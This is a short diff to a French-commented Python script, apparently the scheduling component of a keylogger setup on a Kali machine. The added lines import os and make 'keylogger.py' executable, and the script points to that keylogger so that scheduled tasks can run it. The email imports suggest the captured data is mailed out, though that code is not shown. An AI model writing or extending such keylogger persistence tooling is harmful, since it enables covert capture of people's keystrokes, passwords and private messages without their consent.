@@ -7,9 +7,14 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import subprocess
+import os
 
 
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
+
+#On donne les droits d'exécutions
+os.system('chmod +x keylogger.py')
+
 
 # Chemin vers le script Python
 python_script = "/home/kali/Downloads/keylogger.py"
